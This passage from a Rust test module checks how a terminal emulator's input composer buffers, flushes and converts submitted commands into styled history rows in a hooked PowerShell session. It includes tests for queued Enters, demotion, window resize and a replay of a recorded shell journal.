    fn empty_window_expires_to_busy_without_bytes() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "cargo build".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        let mut d = hook_bytes("exec", r#"{"c":"cargo build"}"#);
        d.extend_from_slice(b"cargo build\r\n   Compiling...\r\n");
        b.advance_live(&d);
        pump_counters(&mut st, &b, now);

        st.tick(&b, &recs, true, false, now + POST_SUBMIT_FLUSH + Duration::from_millis(10));
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::Busy));
        assert!(st.take_pending_clear().is_none(), "no bytes for an empty buffer");
        assert!(!st.buffering());
    }

    /// The flush preserves byte order relative to queued Enters: queued
    /// commands each carry their `\r`, interleaved spacers keep theirs, the
    /// live draft comes last WITHOUT a trailing `\r` (never pressed).
    #[test]
    fn flush_preserves_byte_order_across_queued_enters() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "vim x".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        st.draft = "hi".into();
        st.queue_draft(); // hi⏎
        st.push_spacer(); // ⏎
        st.draft = "tail".into(); // trailing keys, no Enter yet

        b.advance_live(b"\x1b[?1049h"); // the app takes the screen
        st.tick(&b, &recs, true, false, now + Duration::from_millis(30));
        assert_eq!(
            st.take_pending_clear().as_deref(),
            Some(b"hi\r\rtail".as_ref()),
            "byte order: cmd + its Enter, the spacer Enter, then the draft"
        );
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::AltScreen));
    }

    /// Demotion mid-buffer (certainty lost with submissions still queued):
    /// the queue flushes raw — honest shell type-ahead, in order — while the
    /// visible draft is kept exactly like every other demotion.
    #[test]
    fn demotion_mid_buffer_flushes_pending_raw() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "slow".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        st.draft = "next".into();
        st.queue_draft();
        st.draft = "keep me".into();

        // The shell answers with a pre but NEVER a 133;B (wedged prompt
        // render): the window closes on the fresh pre, the pump can never
        // certify a clean prompt, and the demotion clock runs.
        let mut d = hook_bytes("exec", r#"{"c":"slow"}"#);
        d.extend_from_slice(b"slow\r\n");
        d.extend(hook_bytes("pre", r#"{"e":0,"n":9,"d":"C:"}"#));
        d.extend_from_slice(b"PS C:\\> ");
        b.advance_live(&d);
        let t1 = now + Duration::from_millis(100);
        let _ = sim_frame(&mut st, &mut b, &recs, t1);
        assert_eq!(st.mode, ComposerMode::Compose, "clock started, not demoted yet");
        assert!(st.take_pending_clear().is_none());

        let t2 = t1 + DEMOTE;
        st.tick(&b, &recs, true, false, t2);
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::NoPrompt));
        assert_eq!(
            st.take_pending_clear().as_deref(),
            Some(b"next\r".as_ref()),
            "queued submissions flush raw on demotion"
        );
        assert_eq!(st.draft, "keep me", "the visible draft is kept");
        assert!(st.pending.is_empty());
    }

    /// A window whose resolution tick arrives WINDOW_STALE late (deselected
    /// terminal / occluded GUI — tick paused) folds the buffer into the
    /// draft instead of firing bytes into a moment that has passed.
    #[test]
    fn stale_window_folds_buffer_into_draft() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "a".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        st.draft = "b".into();
        st.queue_draft();
        st.draft = "c-partial".into();

        st.tick(&b, &recs, true, false, now + WINDOW_STALE + Duration::from_millis(1));
        assert!(st.take_pending_clear().is_none(), "nothing may fire late");
        assert_eq!(
            st.draft, "b\nc-partial",
            "the buffer is folded into the visible draft for re-confirmation"
        );
        assert!(!st.buffering());
    }

    /// A resize mid-hold drops the pin (release, never convert at reflowed
    /// coordinates) — raw is honest, drift never is.
    #[test]
    fn hold_drops_on_resize() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));
        st.draft = "ls".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        assert_eq!(st.hold_line(&b, now), Some(5));
        b.resize_to(egui::vec2(30.0 * 8.0, 6.0 * 16.0), egui::vec2(8.0, 16.0));
        assert_eq!(st.hold_line(&b, now), None, "resize invalidates the pin");
        st.tick(&b, &recs, true, false, now);
        assert!(st.submit_hold.is_none(), "released");
        assert_eq!(st.take_pending_history_cover(), None, "never converted");
    }

    /// Bug 1a (render-bugs pass, "history rows inconsistently styled"): an
    /// Enter landing inside the pre→133;B prompt-RENDER window used to
    /// dispatch immediately — `can_submit` passes because the pre latched
    /// at_prompt — but with prompt_end invalidated there was no cover_line,
    /// so NO SubmitHold got pinned and that submission was permanently
    /// ineligible for the `❯` history-cover conversion: its row showed raw
    /// `PS …> cmd` forever, right next to converted neighbours. The fix
    /// queues the window submit; pump_pending dispatches it the frame 133;B
    /// lands, with full cover certainty.
    #[test]
    fn window_submit_queues_then_converts_via_pump() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        // cmd1 submitted armed-clean.
        st.draft = "pwd".into();
        let cl = cover_line_for(&st, &b, true, now);
        let (bytes, _) = st.submit(&b, cl, Some("C:\\"));
        assert_eq!(bytes, b"pwd\r");

        // One burst: exec + echo + output + the fresh pre. The prompt text
        // has NOT rendered yet — the render window is open.
        let mut d = hook_bytes("exec", r#"{"c":"pwd"}"#);
        d.extend_from_slice(b"pwd\r\nout\r\n");
        d.extend(hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#));
        b.advance_live(&d);
        let _ = sim_frame(&mut st, &mut b, &recs, now);
        assert_eq!(b.healthy_covers().len(), 1, "cmd1 converted on release");
        assert_eq!(st.mode, ComposerMode::Compose);

        // THE BUG SHAPE: Enter for cmd2 lands NOW, inside the window.
        st.draft = "ls".into();
        let cl = cover_line_for(&st, &b, true, now);
        let (bytes, spacer) = st.submit(&b, cl, Some("C:\\"));
        assert!(bytes.is_empty(), "a window submit must not dispatch uncovered");
        assert!(!spacer);
        assert!(st.buffering(), "queued for the prompt cycle");
        assert!(st.submit_hold.is_none(), "no hold may pin without certainty");
        assert_eq!(st.mode, ComposerMode::Compose);

        // Prompt text + 133;B: the pump dispatches cmd2 with full certainty
        // (this is the show() pump call, one frame later).
        let mut d = b"PS C:\\> ".to_vec();
        d.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&d);
        let _ = sim_frame(&mut st, &mut b, &recs, now);
        let cl = cover_line_for(&st, &b, true, now);
        let (bytes, spacer) = st
            .pump_pending(&b, cl, Some("C:\\"), now)
            .expect("pump dispatches at the fresh clean prompt");
        assert_eq!(bytes, b"ls\r");
        assert!(!spacer);
        assert!(st.submit_hold.is_some(), "hold pinned on the fresh prompt row");

        // cmd2 echoes: release converts — BOTH rows styled, zero raw rows.
        let mut d = hook_bytes("exec", r#"{"c":"ls"}"#);
        d.extend_from_slice(b"ls\r\nout2\r\n");
        b.advance_live(&d);
        let _ = sim_frame(&mut st, &mut b, &recs, now);
        let covers = b.healthy_covers();
        assert_eq!(covers.len(), 2, "both submits converted to history covers");
        assert!(covers.iter().any(|c| c.cmd.as_deref() == Some("pwd")));
        assert!(covers.iter().any(|c| c.cmd.as_deref() == Some("ls")));
    }

    /// Bug 1b: a machine hitch delaying the shell echo past the old 250ms
    /// soft cap used to release the hold UNCONVERTED — and since release is
    /// the only conversion point, the row stayed raw `PS …> cmd` forever
    /// once the late echo landed. The hold now lives until echo_landed (or
    /// the SUBMIT_HOLD_MAX hard bound for input the shell truly ate).
    #[test]
    fn hitch_delayed_echo_still_converts() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));
        st.draft = "ls".into();
        let cl = cover_line_for(&st, &b, true, now);
        let _ = st.submit(&b, cl, Some("C:\\"));

        // 400ms pass with NO bytes (the hitch): past the old soft cap. The
        // hold must survive and keep covering the still-bare prompt row.
        // (h.since is stamped inside submit(), so probe from fresh Instants.)
        let late = Instant::now() + Duration::from_millis(400);
        st.tick(&b, &recs, true, true, late);
        assert!(st.submit_hold.is_some(), "hold survives the hitch");
        assert_eq!(st.hold_line(&b, late), Some(5), "ghost keeps covering");

        // The late echo lands: release + convert (the old cap lost this
        // conversion forever).
        b.advance_live(b"ls");
        let late2 = late + Duration::from_millis(16);
        st.tick(&b, &recs, true, true, late2);
        assert!(st.submit_hold.is_none(), "echo landed ⇒ released");
        assert_eq!(
            st.take_pending_history_cover()
                .map(|(l, c, _, cmd)| (l, c, cmd)),
            Some((5, 8, "ls".to_string())),
            "late echo still converts to a history cover"
        );
    }

    /// Field-journal replay (Bug 1, env-gated): `TC_BUG1_JOURNAL=<path>` to
    /// a REAL hooked-PowerShell journal (.log). Replays the raw byte stream
    /// through the exact mod.rs frame order in ~275-byte chunks (conhost's
    /// real write granularity), submits every command through the composer
    /// at the WORST moment — inside the pre→133;B prompt-render window,
    /// except the first — and asserts every single submission converts to a
    /// `❯` history cover on a row that really shows its echo. This is the
    /// user bar: N mixed-speed submits ⇒ N covers, zero raw `PS …>` rows.
    #[test]
    fn field_journal_all_submits_convert() {
        let Ok(path) = std::env::var("TC_BUG1_JOURNAL") else {
            return;
        };
        let bytes = std::fs::read(&path).expect("journal readable");
        let find_all = |needle: &[u8]| -> Vec<usize> {
            let mut out = Vec::new();
            let mut at = 0;
            while at + needle.len() <= bytes.len() {
                match bytes[at..].windows(needle.len()).position(|w| w == needle) {
                    Some(p) => {
                        out.push(at + p);
                        at += p + needle.len();
                    }
                    None => break,
                }
            }
            out
        };
        let osc_end = |start: usize| -> usize {
            bytes[start..]
                .iter()
                .position(|&b| b == 0x07)
                .map(|p| start + p + 1)
                .expect("hook OSC terminated")
        };
        // Prompt cycle markers: pre-hook OSC ends and 133;B ends, paired in
        // stream order.
        let pres: Vec<usize> = find_all(b";pre;").iter().map(|&p| osc_end(p)).collect();
        let bends: Vec<usize> = find_all(b"\x1b]133;B\x07")
            .iter()
            .map(|&p| p + 8)
            .collect();
        // Commands from the exec payloads (hex JSON {"c":"<cmd>"}).
        let cmds: Vec<String> = find_all(b";exec;")
            .iter()
            .map(|&p| {
                let hex: Vec<u8> = bytes[p + 6..osc_end(p + 6) - 1].to_vec();
                let json: Vec<u8> = hex
                    .chunks(2)
                    .map(|c| u8::from_str_radix(std::str::from_utf8(c).unwrap(), 16).unwrap())
                    .collect();
                let s = String::from_utf8(json).unwrap();
                let c = s.split("\"c\":\"").nth(1).expect("exec has c");
                c.split('"').next().unwrap().to_string()
            })
            .collect();
        let n = cmds.len();
        assert!(n >= 2, "journal must carry at least two commands");
        assert!(pres.len() > n && bends.len() > n, "hook pairs present");

        let mut b = TermBackend::new(GridSize {
            cols: 160,
            rows: 42,
            cell_width: 8.0,
            cell_height: 16.0,
        });
        b.set_stream_pos(0);
        b.enable_block_scan();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        let now = Instant::now();
        let mut fed = 0usize;
        let mut feed_to = |b: &mut TermBackend, st: &mut ComposerState, to: usize| {
            while fed < to {
                let next = (fed + 275).min(to);
                b.advance_live(&bytes[fed..next]);
                fed = next;
                let _ = sim_frame(st, b, &recs, now);
            }
        };

        // Boot to the first armed prompt.
        feed_to(&mut b, &mut st, bends[0]);
        assert_eq!(st.mode, ComposerMode::Compose, "first prompt arms");

        for (i, cmd) in cmds.iter().enumerate() {
            if i == 0 {
                // First command: armed-clean submit (the easy path).
                st.draft = cmd.clone();
                let cl = cover_line_for(&st, &b, true, now);
                let (w, _) = st.submit(&b, cl, Some("C:\\Terminal Control"));
                assert!(!w.is_empty(), "armed submit dispatches");
            } else {
                // Window submit queued at the previous iteration; dispatch it
                // now that this command's prompt is latched clean (the show()
                // pump, one frame after 133;B).
                let cl = cover_line_for(&st, &b, true, now);
                let (w, _) = st
                    .pump_pending(&b, cl, Some("C:\\Terminal Control"), now)
                    .unwrap_or_else(|| panic!("pump dispatches cmd {i} ({cmd})"));
                assert!(!w.is_empty());
            }
            // Feed this command's echo + output + the NEXT prompt's pre.
            feed_to(&mut b, &mut st, pres[i + 1]);
            // The hold must have released AND converted by now.
            assert!(st.submit_hold.is_none(), "cmd {i} ({cmd}) hold released");
            if i + 1 < n {
                // WORST-CASE Enter: the next command submitted INSIDE the
                // render window (this is what left rows raw pre-fix).
                st.draft = cmds[i + 1].clone();
                let cl = cover_line_for(&st, &b, true, now);
                let (w, _) = st.submit(&b, cl, Some("C:\\Terminal Control"));
                assert!(w.is_empty(), "window submit queues (cmd {})", i + 1);
                assert!(st.buffering());
            }
            // Feed the prompt text + 133;B closing this cycle.
            feed_to(&mut b, &mut st, bends[i + 1]);
        }

        // THE BAR: every submission is a healthy `❯` history cover on a row
        // really showing its echo — zero raw `PS …>` command rows.
        let covers = b.healthy_covers();
        let got: Vec<&str> = covers
            .iter()
            .filter_map(|c| c.cmd.as_deref())
            .collect();
        assert_eq!(
            got.len(),
            n,
            "every submit converts: expected {n} history covers, got {got:?}"
        );
        for (i, cmd) in cmds.iter().enumerate() {
            assert!(
                got.iter().filter(|g| **g == cmd.as_str()).count()
                    >= cmds.iter().filter(|c| *c == cmd).count().min(1),
                "cmd {i} ({cmd}) has a cover"
            );
        }
        for c in &covers {
            if let Some(cmd) = &c.cmd {
                assert!(
                    b.row_has_text_at(c.line, c.col, cmd.lines().next().unwrap()),
                    "cover row {} really shows `{cmd}`",
                    c.line
                );
            }
        }
    }
}
